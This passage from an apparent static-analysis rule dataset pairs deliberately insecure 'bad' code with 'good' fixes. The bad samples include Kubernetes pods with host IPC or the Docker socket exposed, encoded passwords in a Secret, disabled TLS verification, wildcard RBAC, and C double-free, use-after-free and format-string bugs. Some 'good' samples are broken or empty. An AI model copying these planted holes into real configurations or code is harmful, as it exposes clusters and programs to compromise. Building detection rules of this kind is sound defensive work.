    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: view-pid\nspec:\n  # ruleid: hostipc-pod\n  hostIPC: true\n  containers:\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - host IPC namespace enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secure-pod\nspec:\n  containers:\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - no hostIPC setting defaults to false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pd\nspec:\n  containers:\n    - image: gcr.io/google_containers/test-webserver\n      name: test-container\n      volumeMounts:\n        - mountPath: /var/run/docker.sock\n          name: docker-sock-volume\n  volumes:\n    - name: docker-sock-volume\n      # ruleid: exposing-docker-socket-hostpath\n      hostPath:\n        type: File\n        path: /var/run/docker.sock",
    "language": "yaml",
    "description": "Pod - Docker socket mounted as hostPath"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pd\nspec:\n  containers:\n    - image: gcr.io/google_containers/test-webserver\n      name: test-container\n      volumeMounts:\n        - mountPath: /data\n          name: data-volume\n  volumes:\n    - name: data-volume\n      emptyDir: {}",
    "language": "yaml",
    "description": "Pod - no Docker socket mounting"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Secret\nmetadata:\n  name: mysecret\ntype: Opaque\ndata:\n  # ruleid: secrets-in-config-file\n  USER NAME: Y2FsZWJraW5uZXk=\n  # ok: secrets-in-config-file\n  UUID: {UUID}\n  # ruleid: secrets-in-config-file\n  PASSWORD: UzNjcmV0UGEkJHcwcmQ=\n  # ok: secrets-in-config-file\n  SERVER: cHJvZA==",
    "language": "yaml",
    "description": "Secret - secrets stored in config file"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "# Using Bitnami Sealed Secrets\napiVersion: bitnami.com/v1alpha1\nkind: SealedSecret\nmetadata:\n  name: mysecret\nspec:\n  encryptedData:\n    password: AgBy8hCi8...encrypted...",
    "language": "yaml",
    "description": "Secret - use Sealed Secrets or external secrets management"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nclusters:\n  # ruleid: skip-tls-verify-cluster\n  - cluster:\n      server: https://192.168.0.100:8443\n      insecure-skip-tls-verify: true\n    name: minikube1\ncontexts:\n  - context:\n      cluster: minikube\n      user: minikube\n    name: minikube\ncurrent-context: minikube\nkind: Config",
    "language": "yaml",
    "description": "Config - TLS verification disabled for cluster"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nclusters:\n  # ok: skip-tls-verify-cluster\n  - cluster:\n      server: https://192.168.0.101:8443\n    name: minikube2\ncontexts:\n  - context:\n      cluster: minikube\n      user: minikube\n    name: minikube\ncurrent-context: minikube\nkind: Config\nusers:\n  - name: minikube\n    user:\n      client-certificate: client.crt\n      client-key: client.key",
    "language": "yaml",
    "description": "Config - TLS verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: apiregistration.k8s.io/v1beta1\nkind: APIService\nmetadata:\n  name: v1beta1.metrics.k8s.io\n# ruleid: skip-tls-verify-service\nspec:\n  service:\n    name: metrics-server\n    namespace: kube-system\n  group: metrics.k8s.io\n  version: v1beta1\n  insecureSkipTLSVerify: true\n  groupPriorityMinimum: 100\n  versionPriority: 100",
    "language": "yaml",
    "description": "APIService - TLS verification disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: apiregistration.k8s.io/v1beta1\nkind: APIService\nmetadata:\n  name: v1beta1.metrics.k8s.io\nspec:\n  service:\n    name: metrics-server\n    namespace: kube-system\n  group: metrics.k8s.io\n  version: v1beta1\n  caBundle: <base64-encoded-ca-cert>\n  groupPriorityMinimum: 100\n  versionPriority: 100",
    "language": "yaml",
    "description": "APIService - TLS verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: bad-role\nrules:\n  # ok: legacy-api-clusterrole-excessive-permissions\n  - apiGroups:\n      - apps\n    resources:\n      - \"*\"\n    verbs:\n      - \"*\"\n  - apiGroups:\n      - \"\"\n    resources:\n  # ruleid: legacy-api-clusterrole-excessive-permissions\n      - \"*\"\n    verbs:\n  # ruleid: legacy-api-clusterrole-excessive-permissions\n      - \"*\"",
    "language": "yaml",
    "description": "ClusterRole - wildcard permissions on core API"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: bad-role-inline\nrules:\n  - apiGroups: [\"\"]\n  # ruleid: legacy-api-clusterrole-excessive-permissions\n    resources: [\"*\"]\n  # ruleid: legacy-api-clusterrole-excessive-permissions\n    verbs: [\"*\"]",
    "language": "yaml",
    "description": "ClusterRole - inline wildcard permissions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: good-role\nrules:\n  # ok: legacy-api-clusterrole-excessive-permissions\n  - apiGroups:\n      - \"\"\n    resources:\n      - configmaps\n    verbs:\n      - get\n      - list\n      - watch\n      - create\n      - update\n      - patch\n      - delete",
    "language": "yaml",
    "description": "ClusterRole - explicit permissions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: read-only-role\nrules:\n  # ok: legacy-api-clusterrole-excessive-permissions\n  - apiGroups:\n      - \"\"\n    resources: [\"*\"]\n    verbs:\n      - list",
    "language": "yaml",
    "description": "ClusterRole - wildcard resources but limited verbs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    tags.datadoghq.com/env: dev\nspec:\n  template:\n    metadata:\n      labels:\n        tags.datadoghq.com/env: dev\n    spec:\n      initContainers:\n        - name: migrate-db\n          env:\n            - name: SQLALCHEMY_DATABASE_URI\n              valueFrom:\n                secretKeyRef:\n                  name: backend-secrets\n                  key: SQLALCHEMY_DATABASE_URI\n                # ruleid: flask-debugging-enabled\n            - name: FLASK_ENV\n              value: development",
    "language": "yaml",
    "description": "Deployment - FLASK_ENV set to development"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\nspec:\n  template:\n    spec:\n      containers:\n        - name: backend\n          env:\n            # ok: flask-debugging-enabled\n            - name: FLASK_ENV\n              value: dev",
    "language": "yaml",
    "description": "Deployment - FLASK_ENV set to non-development value"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "kind: Deployment\napiVersion: apps/v1\nmetadata:\n  name: mumbledj\n  namespace: mumble\nspec:\n  template:\n    spec:\n      containers:\n        - name: app\n          image: underyx/mumbledj\n          resources:\n            limits:\n              # ruleid: no-fractional-cpu-limits\n              cpu: 100m\n              memory: 64Mi\n            requests:\n              # ok: no-fractional-cpu-limits\n              cpu: 20m\n              memory: 32Mi",
    "language": "yaml",
    "description": "Deployment - fractional CPU limit causing throttling"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "kind: Deployment\napiVersion: apps/v1\nmetadata:\n  name: app\nspec:\n  template:\n    spec:\n      containers:\n        - name: app\n          image: panubo/sshd:1.1.0\n          resources:\n            limits:\n              # ok: no-fractional-cpu-limits\n              cpu: 1000m\n              memory: 512Mi\n            requests:\n              cpu: 10m\n              memory: 8Mi",
    "language": "yaml",
    "description": "Deployment - full CPU unit limits"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "from django.urls import path\n\n# ruleid: conflicting-path-assignment\nurlpatterns = [\n    path('path/to/view', views.example_view, name=\"test\"),\n    path('path/to/view', views.other_view, name=\"test\"),\n]\n\n# ruleid: conflicting-path-assignment\nurlpatterns = [\n    path('path/to/view', views.example_view, name=\"test\"),\n    path('path/to/other_view', view.other_view, name=\"hello\"),\n    path('path/to/view', views.other_view, name=\"test\"),\n]\n\n# ruleid: conflicting-path-assignment\nurlpatterns = [\n    path('path/to/view', views.example_view),\n    path('path/to/view', views.other_view),\n]",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "from django.urls import path\n\n# ok: duplicate-path-assignment-different-names, conflicting-path-assignment, duplicate-path-assignment\nurlpatterns = [\n    path('path/to/other_view', views.example_view, name=\"test\"),\n    path('path/to/view', views.example_view, name=\"test\"),\n]\n\n# ok: duplicate-path-assignment-different-names, conflicting-path-assignment, duplicate-path-assignment\nurlpatterns = [\n    path('path/to/other_view', views.example_view, name=\"test\"),\n    path('path/to/view', views.other_view, name=\"test_abc\"),\n]",
    "language": "python",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "from django.urls import path\n\n# ruleid: duplicate-path-assignment-different-names, duplicate-path-assignment\nurlpatterns = [\n    path('path/to/view', views.example_view, name=\"test\"),\n    path('path/to/view', views.example_view, name=\"other_name\"),\n]\n\n# ruleid: duplicate-path-assignment-different-names, duplicate-path-assignment\nurlpatterns = [\n    path('path/to/view', views.example_view, {'abc': 'def'}, name=\"test\"),\n    path('path/to/view', views.example_view, {'abc': 'def'}, name=\"other_name\"),\n]",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "from django.urls import path\n\n# ruleid: duplicate-name-assignment\nurlpatterns = [\n    path('path/to/view', views.example_view, name=\"test123\"),\n    path('path/to/other/view', views.other_view, name=\"test123\"),\n]",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "a, b, c = 1\n\n# ruleid: useless-if-conditional\nif a:\n    print('1')\nelif a:\n    print('2')",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "# a and b are different cases -- ok\nif a:\n    print('1')\nelif b:\n    print('1')\n\n\n# don't report on cases like this\nif a:\n    print('this is a')\nelif b:\n    print('this is b')\nelif c:\n    print('this is c')\nelif d:\n    print('this is d')",
    "language": "python",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "# ruleid: useless-if-body\nif a:\n    print('1')\nelse:\n    print('1')",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "def resolve(key: str) -> str:\n    key = os.path.join(path, \"keys\", key)\n    # ok: code-after-unconditional-return\n    return key, key\n\n# ruleid: return-not-in-function\nreturn (a, b)",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "def resolve(key: str):\n    key = os.path.join(path, \"keys\", key)\n    # ok: code-after-unconditional-return\n    return key\n\n\ndef resolve(key: str) -> str:\n    key = os.path.join(path, \"keys\", key)\n    # ok: code-after-unconditional-return\n    return key",
    "language": "python",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "d = {}\nz = {}\na = {}\nfor i in xrange(100):\n    # ruleid: useless-assignment-keyed\n    d[i] = z[i]\n    d[i] = z[i]\n    d[i+1] = z[i]\n\n    for i in xrange(100):\n        # ruleid: useless-assignment-keyed\n        da[i*1][j] = z[i]\n        da[i*1][j] = z[i]\n        da[i*4] = z[i]",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "# ok for this rule\nx = 5\nx = 5\n\nx = y\nx = y()\n\ny() = y()",
    "language": "python",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "def A():\n    print_error('test')\n\n    # ruleid:useless-inner-function\n    def B():\n        print_error('again')\n\n    # ruleid:useless-inner-function\n    def C():\n        print_error('another')\n    return None",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "def A():\n    print_error('test')\n\n    # ok:useless-inner-function\n    def B():\n        print_error('again')\n\n    # ok:useless-inner-function\n    def C():\n        print_error('another')\n\n    # ok:useless-inner-function\n    @something\n    def D():\n        print_error('with decorator')\n\n    return B(), C()\n\ndef foo():\n    # ok:useless-inner-function\n    def bar():\n        print(\"hi mom\")\n    return bar\n\ndef dec(f):\n    # ok:useless-inner-function\n    def inner(*args, **kwargs):\n        return f(*args, **kwargs)\n    result = other_dec(inner)\n    return result",
    "language": "python",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "class MyClass:\n  some_attr = 3\n  def is_positive(self):\n    return self.some_attr > 0\n\nexample = MyClass()\n# ruleid:is-function-without-parentheses\nif (example.is_positive):\n  do_something()",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "class MyClass:\n  some_attr = 3\n  def is_positive(self):\n    return self.some_attr > 0\n\nexample = MyClass()\n# ok:is-function-without-parentheses\nexample.is_positive()\n# ok:is-function-without-parentheses\nelif (example.some_attr):\n  do_something_else()\nelse:\n  return",
    "language": "python",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "from flask import Flask, json_available, request, testing\n\n# ruleid: flask-deprecated-apis\napp = Flask(__name__)\n\n# ruleid: flask-deprecated-apis\nif json_available:\n    pass\n\n# ruleid: flask-deprecated-apis\nblueprint = request.module\n\n# ruleid: flask-deprecated-apis\nbuilder = testing.make_test_environ_builder(app)\n\n# ruleid: flask-deprecated-apis\napp.open_session(...)\n\n# ruleid: flask-deprecated-apis\napp.save_session(...)\n\n# ruleid: flask-deprecated-apis\napp.make_null_session(...)\n\n# ruleid: flask-deprecated-apis\napp.init_jinja_globals(...)\n\n# ruleid: flask-deprecated-apis\napp.request_globals_class(...)\n\n# ruleid: flask-deprecated-apis\napp.static_path(...)\n\n# ruleid: flask-deprecated-apis\napp.config.from_json(...)",
    "language": "python",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/foo\")\ndef foo():\n    pass\n\n\nif request.method == \"POST\":\n    pass\n\napp.config[\"BAR\"] = \"BAZ\"\napp.register_blueprint(blueprint=object())",
    "language": "python",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "bad",
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(\"hello world\")\n\tvar y = 1\n\n\t// ruleid:useless-if-conditional\n\tif y {\n\t\tfmt.Println(\"of course\")\n\t} else if y {\n\t\tfmt.Println(\"of course other thing\")\n\t}\n\n\t// ruleid:useless-if-body\n\tif y {\n\t\tfmt.Println(\"of course\")\n\t} else {\n\t\tfmt.Println(\"of course\")\n\t}\n}",
    "language": "go",
    "description": "hard to maintain"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Maintainability",
    "type": "good",
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(\"hello world\")\n\tvar y = 1\n\n\tif y {\n\t\tfmt.Println(\"of course\")\n\t}\n\n\tfmt.Println(\"of course2\")\n\tfmt.Println(1)\n\tfmt.Println(2)\n\tfmt.Println(3)\n\tfmt.Println(\"of course2\")\n}",
    "language": "go",
    "description": "maintainable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "int bad_code1() {\n    char *var = malloc(sizeof(char) * 10);\n    free(var);\n    // ruleid: double-free\n    free(var);\n    return 0;\n}",
    "language": "c",
    "description": "C - double free vulnerability, CWE-415"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "int okay_code1() {\n    char *var = malloc(sizeof(char) * 10);\n    free(var);\n    var = NULL;\n    // ok: double-free\n    free(var);\n    return 0;\n}\n\nint okay_code2() {\n    char *var = malloc(sizeof(char) * 10);\n    free(var);\n    var = malloc(sizeof(char) * 10);\n    // ok: double-free\n    free(var);\n    return 0;\n}",
    "language": "c",
    "description": "C - set pointer to NULL after free"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "typedef struct name {\n    char *myname;\n    void (*func)(char *str);\n} NAME;\n\nint bad_code1() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: use-after-free\n    var->func(\"use after free\");\n    return 0;\n}\n\nint bad_code2() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: use-after-free\n    other_func(var->myname);\n    return 0;\n}\n\nint bad_code3(){\n    struct NAME *var;\n    var = malloc(sizeof(s_auth));\n    free(var);\n    // ruleid: use-after-free\n    if(var->auth){\n        printf(\"you have logged in already\");\n    }\n    else{\n        printf(\"you do not have the permision to log in.\");\n    }\n    return 0;\n}\n\nint bad_code4(){\n    int initial = 1000;\n    struct lv *lv = malloc(sizeof(*lv));\n    lv->length = initial;\n    lv->value = malloc(initial);\n    free(lv);\n    // ruleid: use-after-free\n    free(lv->value);\n    return 0;\n}\n\nint bad_code6() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: use-after-free\n    (*var).func(\"use after free\");\n    return 0;\n}\n\nint bad_code7() {\n    char *var;\n    char buf[10];\n    var = (char *)malloc(100);\n    free(var);\n    // ruleid: use-after-free\n    char buf[0] = var[0];\n    return 0;\n}",
    "language": "c",
    "description": "C - use after free vulnerability, CWE-416"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "int okay_code1() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    // This will segmentation fault\n    // ok: use-after-free\n    var->func(\"use after free\");\n    return 0;\n}\n\nint okay_code2() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    // This will segmentation fault\n    // ok: use-after-free\n    other_func(var->myname);\n    return 0;\n}\n\nint ok_code4(){\n    int initial = 1000;\n    struct lv *lv = malloc(sizeof(*lv));\n    lv->length = initial;\n    lv->value = malloc(initial);\n    // ok: use-after-free\n    free(lv->value);\n    // ok: use-after-free\n    free(lv);\n    return 0;\n}\n\nint ok_code6() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = (NAME *)malloc(sizeof(struct name));\n    // ok: use-after-free\n    (*var).func(\"use after free\");\n    return 0;\n}",
    "language": "c",
    "description": "C - safe use after free patterns"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "typedef struct name {\n    char *myname;\n    void (*func)(char *str);\n} NAME;\n\nint bad_code1() {\n    NAME *var;\n    char buf[10];\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: function-use-after-free\n    strcpy(buf, (char*)var);\n    // ruleid: function-use-after-free\n    other_func((char*)(*var));\n    // ruleid: function-use-after-free\n    other_func((char*)var[0]);\n    // ruleid: function-use-after-free\n    var->func(var->myname);\n    return 0;\n}\n\nint bad_code2() {\n    NAME *var;\n    char buf[10];\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    // ruleid: function-use-after-free\n    strcpy(buf, (char*)*var);\n    // ruleid: function-use-after-free\n    other_func((char*)var);\n    // ruleid: function-use-after-free\n    other_func((char*)var->myname);\n    return 0;\n}",
    "language": "c",
    "description": "C - function use after free, CWE-416"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "int okay_code1() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    // This will segmentation fault\n    // ok: function-use-after-free\n    other_func((char*)var);\n    other_func((char*)var->myname);\n    other_func((char*)*var);\n    return 0;\n}\n\nint okay_code2() {\n    NAME *var;\n    var = (NAME *)malloc(sizeof(struct name));\n    free(var);\n    var = NULL;\n    var = (NAME *)malloc(sizeof(struct name));\n    // This will segmentation fault\n    // ok: function-use-after-free\n    other_func((char*)var);\n    other_func((char*)var->myname);\n    other_func((char*)*var);\n    return 0;\n}",
    "language": "c",
    "description": "C - safe function use after free patterns"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "void bad_vsprintf(int argc, char **argv) {\n    char format[256];\n\n    //ruleid: insecure-use-printf-fn\n    strncpy(format, argv[1], 255);\n    char buffer[100];\n    vsprintf (buffer,format, args);\n\n    //ruleid: insecure-use-printf-fn\n    vsprintf(buffer, argv[1], args);\n}\n\nvoid bad_sprintf(int argc, char **argv) {\n    char format[256];\n\n    int a = 10, b = 20, c=30;\n    //ruleid: insecure-use-printf-fn\n    strcpy(format, argv[1]);\n    char buffer[200];\n    sprintf(buffer, format, a, b, c);\n\n\n    char buffer[256];\n    int i = 3;\n    //ruleid: insecure-use-printf-fn\n    sprintf(buffer, argv[2], a, b, c);\n}\n\nvoid bad_printf() {\n    //ruleid: insecure-use-printf-fn\n    printf(argv[2], 1234);\n\n    char format[300];\n    //ruleid: insecure-use-printf-fn\n    strcpy(format, argv[1]);\n    printf(format, 1234);\n}",
    "language": "c",
    "description": "C - insecure format string functions, CWE-134"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "void safe_vsprintf(int argc, char **argv) {\n    //ok: insecure-use-printf-fn\n    vsprintf(\"%s\\n\",argv[0]);\n\n    //ok: insecure-use-printf-fn\n    vsnprintf(buffer, format, args);\n}\n\nvoid safe_sprintf(int argc, char **argv) {\n    //ok: insecure-use-printf-fn\n    sprintf(\"%s\\n\",argv[0]);\n\n    //ok: insecure-use-printf-fn\n    snprintf(buffer, format, a,b,c);\n}\n\nvoid safe_printf() {\n    //ok: insecure-use-printf-fn\n    printf(\"hello\");\n\n    //ok: insecure-use-printf-fn\n    printf(\"%s\\n\",argv[0]);\n}",
    "language": "c",
    "description": "C - safe format string usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "// ruleid:detect-buffer-noassert\na.readUInt8(0, true)\n\n// ruleid:detect-buffer-noassert\na.writeFloatLE(0, true)",
    "language": "javascript",
    "description": "JavaScript - Buffer noassert out-of-bounds, CWE-119"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "// ok:detect-buffer-noassert\na.readUInt8(0)\n\n// ok:detect-buffer-noassert\na.readUInt8(0, false)",
    "language": "javascript",
    "description": "JavaScript - Buffer with bounds checking"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "const util = require('util')\n\nfunction test1(data) {\n  const {user, ip} = data\n  foobar(user)\n  // ruleid: unsafe-formatstring\n  console.log(\"Unauthorized access attempt by \" + user, ip);\n}\n\nfunction test2(data) {\n  const {user, ip} = data\n  foobar(user)\n  const logs = `Unauthorized access attempt by ${user}`\n  // ruleid: unsafe-formatstring\n  console.log(logs, ip);\n}\n\nfunction test3(data) {\n  const {user, ip} = data\n  foobar(user)\n  const logs = `Unauthorized access attempt by ${user} %d`\n  // ruleid: unsafe-formatstring\n  return util.format(logs, ip);\n}",
    "language": "javascript",
    "description": "JavaScript - unsafe format string, CWE-134"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "const util = require('util')\n\nfunction okTest1(data) {\n  const {user, ip} = data\n  foobar(user)\n  const logs = `Unauthorized access attempt by user`\n  // ok: unsafe-formatstring\n  console.log(logs, ip);\n}\n\nfunction okTest2(data) {\n  const {user, ip} = data\n  foobar(user)\n  // ok: unsafe-formatstring\n  console.log(\"Unauthorized access attempt by \" + user);\n}\n\nfunction okTest3(data) {\n  const {user, ip} = data\n  foobar(user)\n  // ok: unsafe-formatstring\n  return util.format(\"Unauthorized access attempt by %d\", ip);\n}",
    "language": "javascript",
    "description": "JavaScript - safe format string usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "namespace MemMarshalCreateSpan {\n    public class MemMarshalCreateSpan {\n        public void MarshalTest() {\n            // ruleid: memory-marshal-create-span\n            Span<T> ToSpan() => MemoryMarshal.CreateSpan(ref _e0, 1);\n\n            // ruleid: memory-marshal-create-span\n            Span<T> ToSpan() => MemoryMarshal.CreateReadOnlySpan(ref _e0, 2);\n\n            // ruleid: memory-marshal-create-span\n            Span<byte> span = MemoryMarshal.CreateSpan(ref Unsafe.AsRef(writer.Span.GetPinnableReference()), 4);\n\n            // ruleid: memory-marshal-create-span\n            Span<byte> span = MemoryMarshal.CreateReadOnlySpan(ref Unsafe.AsRef(writer.Span.GetPinnableReference()), 8);\n        }\n    }\n}",
    "language": "csharp",
    "description": "C# - MemoryMarshal CreateSpan out-of-bounds read, CWE-125"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "",
    "language": "csharp",
    "description": "C# - safe Span creation with bounds checking"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
    "code": "<?php\n\n// ruleid: base-convert-loses-precision\n$token = base_convert(bin2hex(hash('sha256', uniqid(mt_rand(), true), true)), 16, 36);\n\n// ruleid: base-convert-loses-precision\nbase_convert(hash_hmac('sha256', $command . ':' . $token, $secret), 16, 36);\n\n// ruleid: base-convert-loses-precision\n$randString = base_convert(sha1(uniqid(mt_rand(), true)), 16, 36);\n\n// ruleid: base-convert-loses-precision\n$uniqueId = substr(base_convert(md5(uniqid(rand(), true)), 16, 36), 1, 20);\n\n// ruleid: base-convert-loses-precision\n$token = base_convert(sha1($i),7, 36);\n\n// ruleid: base-convert-loses-precision\n$salt = base_convert(bin2hex(random_bytes(20)), 16, 36);\n\n$stringHash = substr(md5($string), 0, 8);\n// ruleid: base-convert-loses-precision\nbase_convert($stringHash, 16, 10);\n\n// ruleid: base-convert-loses-precision\n$seed = base_convert(md5(microtime().$_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);\n\n$bytes = random_bytes(32);\n// ruleid: base-convert-loses-precision\nbase_convert(bin2hex($bytes), 16, 36);\n\n// ruleid: base-convert-loses-precision\nbase_convert(bin2hex(openssl_random_pseudo_bytes(8)), 16, 36);\n\n// ruleid: base-convert-loses-precision\n$salt = base_convert(bin2hex($this->security->get_random_bytes(20)), 16,36);",
    "language": "php",
    "description": "PHP - base_convert loses precision, CWE-190"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "good",
    "code": "<?php\n\n// ok: base-convert-loses-precision\nvar_dump(base_convert(\"0775\", 8, 10));\n\n// ok: base-convert-loses-precision\n$token = 'gleez_profiler/'.base_convert($counter++, 10, 32);\n\n// ok: base-convert-loses-precision\n$color1Index = base_convert(substr($uid, 0, 2), 16, 10) % $totalColors;\n\n// ok: base-convert-loses-precision\n$id_converted = base_convert($row, 10, 36);\n\n// ok: base-convert-loses-precision\n$value = base_convert(substr($value, 2), 16, 10);\n\n// ok: base-convert-loses-precision\nbase_convert(rand(1, 1000000000), 10, 36);\n\n// taking only 7 hex chars makes it fit into a 64-bit integer\n$stringHash = substr(md5($string), 0, 7);\n// ok: base-convert-loses-precision\nbase_convert($stringHash, 16, 10);\n\n// ok: base-convert-loses-precision\nbase_convert(bin2hex(iconv('UTF-8', 'UCS-4', $m)), 16, 10);\n\n// ok: base-convert-loses-precision\n$currentByteBits = str_pad(base_convert(bin2hex(fread($fp,1)), 16, 2),8,'0',STR_PAD_LEFT);\n\n// ok: base-convert-loses-precision\nbase_convert(bin2hex(random_bytes(7)), 16, 36);",
    "language": "php",
    "description": "PHP - safe base_convert usage with small numbers"
  },
  {
    "ruleId": "",
    "ruleTitle": "Ensure Memory Safety",
    "type": "bad",
